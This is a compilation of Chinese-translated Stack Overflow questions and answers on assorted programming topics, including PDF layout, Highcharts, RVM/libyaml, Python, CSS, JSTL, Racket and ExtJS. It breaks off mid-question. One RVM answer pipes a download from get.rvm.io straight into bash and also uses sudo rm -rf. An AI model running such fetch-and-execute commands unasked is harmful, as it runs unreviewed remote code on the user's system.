# php - 如何在 PDF 中正确定位图像旁边的文本？

> ID：15738866
> 
> 赞同：12
> 
> 时间：2013-04-01T06:42:44.677
> 
> 标签：php, css, image, smarty, tcpdf

我正在使用 PHP、Smarty 和 TCPDF 库来生成文档的 PDF 副本。该文档包含来自 WIRIS 编辑器的数学表达式图像以及文本内容。

我在正确定位表达式图像旁边的文本时遇到问题。

我尝试了 CSS`float`属性中的所有内容，但没有任何反应。我正在附上我想要的这封邮件的屏幕截图。

这是打印问题及其选项的 smarty 模板代码：

```
{foreach from=$question_data item=qstn_ans key=key}
    <table border="0" width="100%" cellpadding="2" cellspacing="0">
        <tr>
            <td valign="top" >{if $qstn_ans.question_directions}{$qstn_ans.question_directions}<br /><b>Question {$que_seq_no} : </b>{/if}{$qstn_ans.question_text}</td>
        </tr>
        {if $qstn_ans.question_file}
        <tr>
            <td><img src="{$ques_thum_image_path}{$qstn_ans.question_id}_{$qstn_ans.question_file}" /></td>
        </tr>
        {/if}
        {if $qstn_ans.question_has_sub_ques==0}
            {if $qstn_ans.answer}
                {foreach from=$qstn_ans.answer item=ans key=ans_no}
                    <td valign="top" >
                        {if $ans.answer_is_right==1}{assign var='correct_ans' value=$ans_no+1}{/if}
                            <b>{$ans_no+1}.</b>&nbsp;&nbsp;{if $ans.answer_text!=''}{$ans.answer_text}{/if}
                            {if $ans.answer_file!=''}<img src="{$ans_thumb_img_path}{$ans.answer_id}_{$ans.answer_file}" />{/if}
                     </td>
                </tr>
                {/foreach}
        <tr>
            <td></td>
        </tr>
    </table>
{/foreach} 
```

此代码段可能包含一些错误，因为我随机粘贴它而没有检查循环和括号完成，但这不是这里的问题。

此代码中唯一重要的部分是打印问题文本和问题图像（如果存在）的行。

我研究了正确的解决方案，但无法获得所需的解决方案。谁能帮我吗。

[截屏](http://i.stack.imgur.com/nkSjB.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-06T15:51:18.030

我同意 Nerdwood 的观点，这看起来不像是 Smarty 问题。我认为这只是一个CSS问题。`img`向下延伸到足以捕捉下一行文本的左边缘。您需要将文本向下撞，以便它可以向左移动。你可以把一个 CSS 属性放在`img`like`clear: right;`

我认为应该这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-21T14:25:19.550

TCPDF 的 HTML 并不完美，因此您应该`width`在每个中使用属性`<td>`：

```
...
<tr>
    <td valign="top" width="250" >
        {if $qstn_ans.question_directions}{$qstn_ans.question_directions}<br /><b>Question {$que_seq_no} : </b>{/if}{$qstn_ans.question_text}
    </td>
</tr>
    {if $qstn_ans.question_file}
<tr>
    <td width="100">
        <img src="{$ques_thum_image_path}{$qstn_ans.question_id}_{$qstn_ans.question_file}" />
    </td>
</tr>
    {/if}
... 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-04T09:47:44.850

发现此代码正常工作

```
$html = <<<EOD
<h1><img src="http://www.google.com/logos/2013/wangari_maathai_73rd_birthday-1400005-hp.jpg" height="50px" width="150px"> Welcome to <a href="http://www.tcpdf.org" style="text-decoration:none;background-color:#CC0000;color:black;">&nbsp;<span style="color:black;">TC</span><span style="color:white;">PDF</span>&nbsp;</a>!</h1>
<i>This is the first example of TCPDF library.</i>
<p>This text <img src="http://www.google.com/logos/2013/wangari_maathai_73rd_birthday-1400005-hp.jpg" height="50px" width="150px"> <br>is printed using the <i>writeHTMLCell()</i> method but you can also use: <i>Multicell(), writeHTML(), Write(), Cell() and Text()</i>.</p>
<p>Please check the source code documentation and other examples for further information.</p>
<p style="color:#CC0000;">TO IMPROVE AND EXPAND TCPDF I NEED YOUR SUPPORT, PLEASE <a href="http://sourceforge.net/donate/index.php?group_id=128076">MAKE A DONATION!</a></p>
EOD;

// Print text using writeHTMLCell()
$pdf->writeHTMLCell($w=0, $h=0, $x='', $y='', $html, $border=0, $ln=1, $fill=0, $reseth=true, $align='', $autopadding=true); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-12T02:15:58.430

似乎所有不对齐的信息都来自`$qstn_ans.question_text`，所以上面的代码并没有真正的问题。

我建议将该问题文本中的每个“陈述”保存在单独的段落中。例如

```
<p>Statement I: The variance of first n even natural numbers is <img src="?" /></p>
<p>Statement II: The sum of first n natural numbers is <img src="?" /></p>
<p>and the sum of squares of first n natural numbers is <img src="?" /></p> 
```

这应该会导致问题文本的每一“行”单独显示而不会相互碰撞。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-09T18:01:59.357

尝试使用`<br>`可以解决您的问题的代码

# javascript - 如何在java脚本中从数组中搜索数据

> ID：15738867
> 
> 赞同：0
> 
> 时间：2013-04-01T06:42:58.863
> 
> 标签：javascript, arrays, html

我在javascript中有数组。我希望当我在文本字段中输入数组的任何索引时，它应该返回该数组的值并显示它我正在使用以下代码

```
 <!DOCTYPE html>
 <html>
 <body>

 <p id="demo">Click the button to extract the second and the third elements from the array.</p>

 <button onclick="myFunction()">Try it</button>

 <script>
 function myFunction()
 {
     var bb=document.getElementById('input_field').value;
     var fruits = ["Banana", "Orange", "Lemon", "Apple", "Mango","Apple"];
     var citrus = fruits.slice(bb,4);
     var x=document.getElementById("demo");
     x.innerHTML=citrus;
 }
 </script>

<input type="text" id="input_field">
</body>
</html> 
```

但问题是，如果我在文本字段中输入 2 那么它会显示 Lemon 但是当我输入三个时它只显示一个 Apple 但它应该显示两个因为数组中有两个 Apple 所以我希望如果有两个则显示两个喜欢明智的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:50:48.680

作为一个有用的替代方案，我认为像这样管理数据集会更容易：

```
var fruits = {
    "Banana" : 1,
    "Orange" : 1, 
    "Lemon"  : 1, 
    "Apple"  : 2, 
    "Mango"  : 1
}; 
```

甚至...

```
var fruits = [
    {type : "Banana", qty : 1},
    {type : "Orange", qty : 1}, 
    {type : "Lemon",  qty : 1}, 
    {type : "Apple",  qty : 2}, 
    {type : "Mango",  qty : 1}
]; 
```

然后`fruits[3].qty; // 2`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:13:32.673

Array.slice 提取数组的子范围。您硬编码的“4”是切片的结尾，而不是要提取的项目数。因此，当您输入“2”时，您将获得第三个和第四个元素；当您输入“3”时，您将仅提取数组的第四项，即 fruits[3]。

# highcharts - 能够为绘制的日期期间应用彩色区域

> ID：15738871
> 
> 赞同：0
> 
> 时间：2013-04-01T06:43:10.430
> 
> 标签：highcharts, highstock

在这个例子[中 JFiddle Link](http://jsfiddle.net/hfrntt/qwfZ9/1546/)。我想为绘制/选定的日期期间应用彩色区域。例如，如果我选择点 1 到 10，则应突出显示这些点的背景。

```
var $report = $('#report');

// create the chart
var chart = new Highcharts.Chart({
chart: {
    renderTo: 'container',
    events: {
        selection: function(event) {
            if (event.xAxis) {
                var min = Math.ceil( event.xAxis[0].min ),
                    max = Math.ceil( event.xAxis[0].max ),
                    data = this.series[0].data,
                    list = [];

                $('#report').empty();

                for(i=min; i<max; i++)
                    list.push('<li>x: '+data[i].x+', y: '+data[i].y+'</li>');

                $('#report').append( list.join('') );

            }
            return false;
        }
    },
    zoomType: 'x'
},
xAxis: {
},

series: [{
    data: [29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 216.4, 194.1, 95.6,     54.4]        
}]
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T12:14:33.963

您需要做的就是`PlotBand`在您的`selection`活动中添加。

```
 chart.xAxis[0].removePlotBand('plot-band-1');
                chart.xAxis[0].addPlotBand({
                    from: min,
                    to: max,
                    color: '#FCFFC5',
                    id: 'plot-band-1'
                }); 
```

例子**[`here`](http://jsfiddle.net/gopinaghr/qwfZ9/2892/)**。**[`API`](http://api.highcharts.com/highcharts#Axis.addPlotBand%28%29)**供你参考。

希望这可以帮助。

# php - 广告网络基础设施意见？MySQL？内存缓存？MongoDB？

> ID：15738875
> 
> 赞同：1
> 
> 时间：2013-04-01T06:43:35.010
> 
> 标签：php, mysql, memcached, scalability

我们计划创建一个广告网络。与任何普通的在线广告网络一样，我们将为发布商/广告商提供广告服务、报告（统计）和一个小型浏览网站。

因为应用程序会收到大量的展示（广告投放）请求，我们的应用程序必须能够快速插入数据以记录展示次数和点击次数，记录每个发布商/广告商的展示次数和点击次数。然后，此数据将用于监控来自发布商的印象/点击并生成报告。

目前我们已经计划整个系统基于 PHP、MySQL (InnoDB)、php-eAccelerator、Memcached（仅用于存储活动广告）

**问题/问题**

缩放...

我真的觉得当我们的流量增长时，我们的应用程序不会很好地扩展。

MySQL 插入和更新肯定会成为瓶颈。还有如何将这一切分发到多个服务器，以便我们的应用程序可以根据负载进行扩展。

任何人都可以帮助提出应用程序的结构，尤其是印象记录和计算吗？MongoDB 会是一个更好的解决方案吗？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:48:36.790

我已经使用 MySQL 构建了几个大容量统计收集系统。只要您通过仔细计划保持领先于缩放曲线，它们的性能就相当不错。特别是，如果您正在执行大量`INSERT`或`UPDATE`查询、大量写入，则需要保持行大小更小，例如使用`INT`查找表而不是`VARCHAR`列，并注意索引的大小得到。

总是，*总是*用大量的测试数据来模拟你的模式。滥用它到崩溃点，修复它，然后再次滥用它。你想看到烟雾，或者你不够努力。请记住，硬件有很大的不同，所以要小心使用尽可能接近部署目标的东西。您的 SSD 笔记本电脑将在 RAID10 设置中使用 15K 企业驱动器的服务器关闭大门，例如，如果您正在执行大量写入。

话虽如此，您可能想看看[Redis](http://redis.io/)。它不是一个关系型数据库，但它比 MySQL 快几个*数量级*，例如“在 X 列加一”或“给我 Z 间隔的 Y 计数”类型的操作。

# perl - 用于创建 CLI 的 perl 模块

> ID：15738876
> 
> 赞同：0
> 
> 时间：2013-04-01T06:43:35.177
> 
> 标签：perl, command-line-interface, cpan, mod-perl

我想知道是否有任何现有的 perl 模块可以提供创建新 CLI 命令的框架？

谢谢阿皮特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:58:12.607

它们有很多很多。例如[看这里](http://www.slideshare.net/nickpatch/modern-getopt-for-command-line-processing-at-yapcna-2011)。

为了让你开始，也许看看[Getopt::Long::Descriptive](https://metacpan.org/module/Getopt%3a%3aLong%3a%3aDescriptive)。另一种建议是，如果您想创建命令驱动的应用程序（如`git`命令），请查看[App::Cmd](https://metacpan.org/module/App%3a%3aCmd)。

如果你使用 Moose，有一些模块将它与上述集成（例如 MooseX::Getopt 和 MooseX::App::Cmd）虽然我发现启动时间很慢。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T07:18:31.717

我在上一个项目中成功使用[了 MooseX::App 。](http://search.cpan.org/perldoc?MooseX%3a%3aApp)这是一个基于 Moose 的解决方案，并且易于使用。

如果你不想要 Moose，[App::Cmd](http://search.cpan.org/perldoc?App%3a%3aCmd)很好。

# ruby-on-rails - 请安装 libyaml 并重新安装您的 ruby

> ID：15738883
> 
> 赞同：14
> 
> 时间：2013-04-01T06:44:23.577
> 
> 标签：ruby-on-rails

即使您安装了 libyaml，libyaml 警告也不会消失

```
gem install bundler
/home/ec2-user/.rvm/rubies/ruby-1.9.3-p392/lib/ruby/1.9.1/yaml.rb:56:in `<top  (required)>':
It seems your ruby installation is missing psych (for YAML output).
To eliminate this warning, please install libyaml and reinstall your ruby.
Fetching: bundler-1.3.4.gem (100%)
Successfully installed bundler-1.3.4 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-01T06:54:17.560

首先删除任何以前的 yaml 文档

```
cd .rvm/src
sudo rm -rf yaml* 
```

然后您可以通过以下方式完成其余的安装 -

`rvm pkg install libyaml`

PS 在此之后您将需要重新安装 ruby​​。

* * *

**更新：**如果`rvm pkg`似乎已被弃用。您可以自己编译源代码。你所要做的就是从 [http://pyyaml.org/download/libyaml/下载最新版本的 libyaml](http://pyyaml.org/download/libyaml/)

```
tar zxf yaml-0.1.4.tar.gz
cd yaml-0.1.4
./configure
make
make install 
```

* * *

**UPDATE2：**顺便说一句，您仍然可以使用 rvm pkg 和/或在重新安装 ruby​​ 时确保通过以下方式启用 autolibs `\curl -L https://get.rvm.io | bash -s stable --rails --autolibs=enable`

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2014-07-23T05:58:20.323

如果使用自制软件，对我有用的临时修复是运行：

```
brew unlink libyaml && brew link libyaml 
```

另外，您可能还需要运行：

```
brew unlink openssl && brew link --force openssl 
```

有关更多详细信息，请参阅此问题线程：[https ://github.com/wayneeseguin/rvm/issues/2689](https://github.com/wayneeseguin/rvm/issues/2689)

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2014-08-15T16:03:27.467

我的一个朋友在他的mac上遇到了类似的问题。

`brew install libyaml`

最终为我们工作，我们能够避免重新安装 ruby​​。

# python - python：如何在一副牌中生成成对的牌

> ID：15738884
> 
> 赞同：1
> 
> 时间：2013-04-01T06:44:34.027
> 
> 标签：python

假设我有以下变量：

```
suits = ["h","c", "d", "s"]
cards = ["2","3", "4", "5", "6", "7", "8", "9", "t", "j", "q", "k", "a"]
deck = []

for suit in suits:
    for card in cards:
        deck.append(str(card+suit)) 
```

我想写一个函数，给定一张特定的卡片，生成可能的对组合。

例如，`generatePairs('a')`应该返回类似：

`['ahac','ahad','ahas','acad','acas','adas']`

但我不确定如何编写该函数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:50:21.853

```
In [7]: import itertools

In [8]: c = 'a'

In [9]: ['%s%s%s%s' % (c, s1, c, s2) for (s1, s2) in itertools.combinations(suits, 2)]
Out[9]: ['ahac', 'ahad', 'ahas', 'acad', 'acas', 'adas'] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:50:52.243

你需要类似的东西

```
In [5]: deck = []

In [6]: for i in itertools.combinations(suits, 2):
   ...:     for j in cards:
   ...:         deck.append(j+i[0]+j+i[1])
   ...:

In [7]: print deck
['2h2c', '3h3c', '4h4c', '5h5c', '6h6c', '7h7c', '8h8c', '9h9c', 'thtc', 'jhjc', 'qhqc', 'khkc', 'ahac',
', '3h3d', '4h4d', '5h5d', '6h6d', '7h7d', '8h8d', '9h9d', 'thtd', 'jhjd', 'qhqd', 'khkd', 'ahad', '2h2s'
3s', '4h4s', '5h5s', '6h6s', '7h7s', '8h8s', '9h9s', 'thts', 'jhjs', 'qhqs', 'khks', 'ahas', '2c2d', '3c3
4c4d', '5c5d', '6c6d', '7c7d', '8c8d', '9c9d', 'tctd', 'jcjd', 'qcqd', 'kckd', 'acad', '2c2s', '3c3s', '4
 '5c5s', '6c6s', '7c7s', '8c8s', '9c9s', 'tcts', 'jcjs', 'qcqs', 'kcks', 'acas', '2d2s', '3d3s', '4d4s',
', '6d6s', '7d7s', '8d8s', '9d9s', 'tdts', 'jdjs', 'qdqs', 'kdks', 'adas'] 
```

# macos - 这是什么IDE？看过好几遍，非常好看

> ID：15738885
> 
> 赞同：0
> 
> 时间：2013-04-01T06:44:45.237
> 
> 标签：macos, ide

本站图片： [https](https://www.leapmotion.com/developers) ://www.leapmotion.com/developers 那个女孩用的是什么程序？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:47:20.020

在我看来，它就像[RubyMine](http://www.jetbrains.com/ruby/)。代码库底部的三个连续`end`语句表明它是 Ruby，而右侧的拆分窗口以及上下文感知检查强烈表明这是 JetBrains 产品。

底部的 JVM 指示器很重要——它一直存在于我接触过的每个 JetBrains IDE 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:54:51.187

由于您不厌其烦地为此添加了一个 " `osx`" 标记，您可能想知道如何使用 Xcode 执行此操作。

在 Xcode 首选项中，有一个“字体和颜色”选项卡，如下所示：

![看看漂亮的 xcode 颜色](https://i.stack.imgur.com/32dzM.jpg)

你可以很容易地改变你的 Xcode IDE 的配色方案，让它像你喜欢的那样引人注目（或侮辱眼睛）。

# html - CSS：将 3 列布局为 2 列

> ID：15738886
> 
> 赞同：0
> 
> 时间：2013-04-01T06:44:45.673
> 
> 标签：html, css, layout, multiple-columns

我有一个包含 3 列的布局：

```
----------------------------------
|left     |middle      |right    |
---------------------------------- 
```

这很好，但我想在较小的屏幕上有 2 列：

```
---------------------
|left     |right    |
---------------------
|middle             |
--------------------- 
```

第二行的宽度必须为 100%，这一点很重要。

是否可以仅使用 CSS 来做到这一点？

我的 HTML 标记：

```
<article class="item">
    <div class="item-name">left</div>
    <div class="item-ingredients">middle</div>             
    <div class="item-prices">
        <div class="item-price">right1</div>                    
        <div class="item-price">right2</div>                    
        <div class="item-price">right3</div>
    </div>
</article> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:01:17.260

使用媒体查询，此[链接](http://css-tricks.com/css-media-queries/)可帮助您了解媒体查询

html

```
<article class="item">
    <div class="item-name">left</div>           
    <div class="item-prices">
        <div class="item-price">right1</div>                    
        <div class="item-price">right2</div>                    
        <div class="item-price">right3</div>
    </div>
    <div class="item-ingredients">middle</div>  
</article> 
```

css

```
.item {float:left; width:100%}
.item div {
    float:left;
    width:33.3%;
    background-color:#555;
}
.item div div {width:33%}
.item div.item-ingredients {background-color:blue}
.item div.item-prices {float:right}

@media handheld, screen and (max-width: 500px){
    .item div.item-ingredients{
        width:100%;
    }
    .item div {width:50%}
} 
```

顺便说一句，别忘了把这个放在`tag`你的结尾`head`

```
<meta name="viewport" content="width=device-width" /> 
```

更新[演示](http://jsfiddle.net/MsYdJ/24/)

注意：滚动小提琴查看效果

希望这对你有帮助....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:03:39.807

使用这个 html 和 css。

```
<article class="item">
 <div class="first" style="width:100%;">
   <div class="item-name" style="width:50%; float: left;">left</div>
   <div class="item-ingredients" style="width:50%; float: left;">right</div> 
 </div> 
 <div class="item-prices" style="width:100%;">middle</div>
</article> 
```

希望对您有所帮助。

# c - cerf、cerfc、ctgamma 和 clgamma 函数的状态？

> ID：15738890
> 
> 赞同：1
> 
> 时间：2013-04-01T06:45:00.197
> 
> 标签：c, complex-numbers, cmath

如果我们查看 C11 的草案，则保留了以下名称：

```
7.31 Future library directions
The following names are grouped under individual headers for convenience. All external
names described below are reserved no matter what headers are included by the program.
7.31.1 Complex arithmetic <complex.h>
The function names
cerf cerfc cexp2 cexpm1 clog10 clog1p clog2 clgamma ctgamma
and the same names suffixed with f or l may be added to the declarations in the
<complex.h> header. 
```

由于我非常希望将复杂的 gamma 函数视为标准 C 的一部分（因为它们是许多其他复杂函数的基础），所以我想知道 7.31.1 子句的真正含义是什么。

为什么只添加声明而不添加它们的定义？

我们可以期待它们用于下一个 C 标准或次要版本吗？（如果答案是肯定的，预计下一个标准何时发布？）

是否有任何实现已经可用作编译器的非标准扩展？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-12T08:59:49.977

几个月前，我发布了一个库[libcerf](https://jugit.fz-juelich.de/mlz/libcerf)，它提供了缺失的函数 cerf 和 cerfc，基于 Steven G. Johnson 的数字代码。我们的实现精确到 13-14 位，这对于几乎所有实际用途来说已经足够了 - 但在实现这一点时，人们明白需要做多少工作才能编写一个可接受的标准：这不太可能会进行任何人很快。

所以关于你关于 clgamma 和 ctgamma 的问题：不要等待标准。搜索可以正常工作的代码。理想情况下，包装此代码并提供一个类似于 libcerf 的库，该库几乎与标准实现一样好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T09:33:40.230

glibc 的维护者几乎从不想添加没有以任何方式标准化的新功能，而且 cerf 不是 C99 标准的一部分——它只是为将来可能使用而保留的，这使得 glibc 不太可能接受直到函数的所需行为标准化为止。

不过，如果它被合并，那肯定会很好，就像 C++ 代码中的“erf()”，而是“cerf()”。

根据手册：

cerf[f|l]C99 可选的复杂错误函数，**如果提供，则必须在 complex.h 中声明。**

根据上述声明，**仅**在提供时才声明函数。

# c# - 我如何验证整个计算机而不是网络浏览器？

> ID：15738899
> 
> 赞同：0
> 
> 时间：2013-04-01T06:46:00.210
> 
> 标签：c#, asp.net, winforms, authentication

在过去的 2 年中，我们为我的一个客户创建了 3 个桌面应用程序和 2 个管理部分（网络）。每个应用程序都使用自己的身份验证过程。我已将 Web 的身份验证过程合并到一个单元中。但是客户希望有一个屏幕用于在桌面应用程序和网站上进行身份验证。

他还想使用不同的浏览器，用户名/密码应该只询问一次，而不管浏览器是否打开。

我尝试将 cookie 用于网络。但是每个浏览器都有自己的 cookie。

任何人都可以建议我如何对整个计算机的用户进行身份验证，以便无论使用哪种浏览器，身份验证信息都可用于桌面应用程序以及网站？

**编辑：** ~~正如乔所建议的那样，在我的情况下，使用 Windows 身份验证是不可能的。因此，我创建了一个带有以下列 ip、userid、authenticatedat 的表，当用户通过身份验证时，我将其 ip、userid 和时间插入表中。当一个非身份验证用户首先出现时，如果 ip 存在并且authenticatedat 在 30 分钟内，我会在表中查看我假设用户已通过身份验证并使用所需数据设置会话/变量。我已经检查并发现它正在工作。~~

我发现这并不安全。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:56:37.363

Windows 身份验证是我知道的唯一方法。假设您的用户位于您控制的域中，那么他们的 Windows 凭据将验证他们，并且他们永远不需要输入用户名和密码。

除此之外，我只能想到让这件事发生的骇人听闻的肮脏方法。您可以在他们的机器上安装一个身份验证服务，该服务可用于从其他应用程序远程连接 - 这些应用程序将调用您的服务，该服务将对用户进行身份验证并将身份验证令牌传回。对于 Windows 应用程序来说足够简单，但在 Web 应用程序上实现这一点并不有趣。您的 Web 服务器将无法与此服务通信，因此您必须依赖客户端 javascript 与服务通信并检索令牌或哈希，然后 javascript 将其传递给 Web 服务器。

你放在本地机器上的任何东西，你都必须假设用户可以逆向工程和操作，所以如果你需要真正的安全性，我怀疑你会找到解决方案。最好的办法是让用户在每次需要时登录，并在您的 Web 服务层上有您的身份验证/授权代码。

# java - jstl 中的 if/else 逻辑

> ID：15738900
> 
> 赞同：0
> 
> 时间：2013-04-01T06:46:07.800
> 
> 标签：java, jsp, jstl, el

我试图确保对象列表不为空并且其中至少包含一项。请告诉我下面的代码片段我做错了什么。

```
<c:if test=" ${ (not empty educations) && (fn:length(educations) ge 1) }">
            <c:forEach items="${educations}" var="edu">
                <div class="educations">                    
                    <label>Position</label><input type="text" name="${ edu.index }"  /><br/>
                    <label>School</label><input type="text" name="${ edu.school }" /><br/>
                    <label>Degree</label><input type="text" name="${ edu.degree }"   /><br/>
                    <label>GPA</label><input type="text" name="${ edu.scored }"   /><br/>
                    <label>Start Date</label><input type="text" name="${ edu.startDate }"   /><br/>
                    <label>End Date</label><input type="text" name="${ edu.endDate }"  /><br/>
                </div>
            </c:forEach>        
        </c:if> 
```

我发现它在调试的 if 语句处停止，并且即使教育列表中有项目，内部的 HMLT 标记也没有呈现

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:19:15.407

您是否正确包含了 JSTL 功能？

```
<%@taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions"%> 
```

并且还在访问任何变量之前添加前缀 requestScope。

```
<c:if test=" ${not empty requestScope.educations}">
        <c:forEach items="${requestScope.educations}" var="edu">
            <div class="educations">                    
                <label>Position</label><input type="text" name="${ edu.index }"  /><br/>
                <label>School</label><input type="text" name="${ edu.school }" /><br/>
                <label>Degree</label><input type="text" name="${ edu.degree }"   /><br/>
                <label>GPA</label><input type="text" name="${ edu.scored }"   /><br/>
                <label>Start Date</label><input type="text" name="${ edu.startDate }"   /><br/>
                <label>End Date</label><input type="text" name="${ edu.endDate }"  /><br/>
            </div>
        </c:forEach>        
</c:if> 
```

如果你只做`empty`检查会更好

您的意图是使用 then 遍历列表，最好知道当提供的项目为空时它已经不会运行。如果 直接被这个检查包围，那么这个检查完全是多余的。

# lisp - 如何制作 Racket 阅读器宏以将一个字符的任何实例转换为另外两个字符？

> ID：15738901
> 
> 赞同：3
> 
> 时间：2013-04-01T06:46:19.033
> 
> 标签：lisp, scheme, racket

更具体地说，我需要`|`将任何实例转换为`\|`. 我尝试阅读有关阅读器宏的文档，但我非常迷茫。有人可以用可以理解的术语解释这一点，或者理想地告诉我如何编写这样的宏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T22:26:41.977

您实际上是在破坏`|`通常语法中的通常含义，因此您应该以某种统一的方式真正做到这一点，以尽量减少意外。您的解决方案没有这样做 - 它`|`根据是否是第一件事而区别对待，这很糟糕。例如，`xxx|xxx`将其读取为整个符号中的一个字符，这意味着您会得到一个名称为 的符号`"xxx|xxx"`，但输入`|xxx`会得到两个符号，名称分别为`"|"`和`"xxx"`。因此，最好将您的语法`|`视为其他字符，以获得更一致且更易于解释的行为。

您的代码的另一个可能问题是您将其`#f`用作 readtable，这意味着阅读器不会与可能被修改的阅读器组合。

最后，您应该真正注意额外的参数，并在给出它们时返回一个语法对象。原因很明显，我猜你不这样做的原因是你对阅读这样的代码感兴趣。但是你真的应该用一只眼睛关注潜在的扩展，在 Racket 中，这种代码的明显未来将是组成一种适当的语言而不是 read+eval hack。确实，这看起来有点矫枉过正，但在这种情况下，有一个简单的解决方案是使用“与其他字符相同”快捷方式来避免编写冗长的代码。

以下解决了所有这些问题：

```
(define rt (let ([c (current-readtable)]) (make-readtable c #\| #\a c))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T22:01:08.217

弄清楚了！这是调整`(read)`函数以更改`|`into的所有实例的代码`\|`：

```
(define rt2 (make-readtable #f #\| 'non-terminating-macro
                            (lambda (c in . _)
                              '\|)))

(parameterize ([current-readtable rt2]
               [current-namespace ns])
  (eval (read))) 
```

# python - xlwt 是否支持 xlsx 格式

> ID：15738904
> 
> 赞同：23
> 
> 时间：2013-04-01T06:46:45.697
> 
> 标签：python, xlwt

我搜索了谷歌并发现了一些矛盾。xlwt 是否支持 xlsx 文件（MS office 2007）。听说 xlwt 0.7.4 支持 xlsx 文件。有没有人用 xlwt 0.7.4 尝试过 xlsx 文件写入操作

这个问题的目的是，如果我需要安装我没有安装库的权限，我需要提供更多详细信息。我需要在 python 中编写 xlsx 文件。所以如果有人做过类似的事情，它将有助于提供更好的信息

我已经查看了这个 wiki 页面。[https://pypi.python.org/pypi/xlwt](https://pypi.python.org/pypi/xlwt) 但是没发现支持xlsx文件

还是我应该使用[https://pypi.python.org/pypi/openpyxl](https://pypi.python.org/pypi/openpyxl)来编写 xlsx 文件

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-01T07:21:11.283

openpyxl 保证写入 xlsx 文件。通过粗略阅读一些 xlwt 代码和文档/示例，我认为 xlwt 不支持 xlsx。如果 openpyxl 可以满足您的需要，为什么还要寻找其他地方呢？

编辑：使用 xlwt 版本 0.7.4 我尝试将文件另存为`sample.xlsx`. 在尝试打开它时，我收到一条`not valid`错误消息，所以暂时没有`.xlsx`文件。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-04-01T09:03:00.427

xlwt 模块不支持 xlsx 格式。xlsx 文件格式与 xlwt 支持的 xls 格式完全不同。

作为替代方案，请查看[XlsxWriter](https://pypi.python.org/pypi/XlsxWriter)，它是一个用于创建 xlsx 文件的 Python 模块。

它支持许多 Excel 功能。查看[文档](https://xlsxwriter.readthedocs.org/en/latest/)或从[示例](https://xlsxwriter.readthedocs.org/en/latest/examples.html)开始。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2019-06-15T04:18:57.747

2021 年更新：xlrd 已达到使用寿命（由于 xls 格式的安全问题）。您可以`openpyxl`用于读取和写入数据。`xlsxwriter`如果您正在编写大型文件并且写入性能至关重要，您也可以用于写入。请参阅：[https ://openpyxl.readthedocs.io/en/stable/performance.html](https://openpyxl.readthedocs.io/en/stable/performance.html)

2019 更新：`xlwt`不支持 xlsx 格式。

[XlsxWriter](https://github.com/jmcnamara/XlsxWriter) 100% 兼容 xlsx，维护良好，口碑不错。

要读取 xlsx 文件，您可以使用`xlrd`.

`Pandas`如果您有读写要求并想要创建图形和图表，也可以使用。（Pandas 内部使用 XlsxWriter 模块来写入文件）。

PS - xlsx 中的最后一个 x 代表 XML。xlsx 是一个压缩的 Open XML 文件。尽可能使用 xlsx。xls 是旧的（专有）格式，它没有一些高级功能，如条件格式或冻结 col/rows 等。

# extjs - 本地数据的 Extjs 网格面板性能问题

> ID：15738905
> 
> 赞同：3
> 
> 时间：2013-04-01T06:46:47.837
> 
> 标签：extjs, xml-parsing, rendering, store, gridpanel

我正在研究一个用户可以**加载 xml 文件**并通过网格面板进行编辑的网格。它**适用于大约 200 行**。但是，有些用户可能希望一次加载**50000 条记录**。

当我尝试加载具有 10k 条记录的文件时，firefox 崩溃并且 chrome 等待太多。经过一些调试，我意识到**将数据渲染到面板需要太多时间**。对于每一个新行，我都需要刷新需要太多时间的网格。

重要的一点是，xml 文件永远不会到达服务器端，我们使用 extjs 读取它并加载到网格中。

是否可以**加载整个数据进行存储**但**请求一定数量的数据来呈现面板**视图？

我尝试了无限网格但无法使其工作，因为我的数据源是一个字符串。您提供什么来管理 50k 数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:55:45.863

过去，我在尝试加载非常大的网格时遇到过类似的 ExtJS 问题。首先让我说，这当然不是他们的错 - 50,000 多条记录只是太多的数据。为了解决这个问题，我使用了分页。

查看[他们](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.toolbar.Paging)的分页工具栏文档。

这是[一个例子](http://docs.sencha.com/ext-js/4-2/extjs-build/examples/grid/paging.html)。

我唯一的其他建议是使用无限网格，但在您的 XML 数据上编写一个文件转换包装器以将其转换为 JSON。

# android - 当我的应用失去焦点并重新获得焦点时，UI 会更新。奇怪的问题

> ID：15738908
> 
> 赞同：4
> 
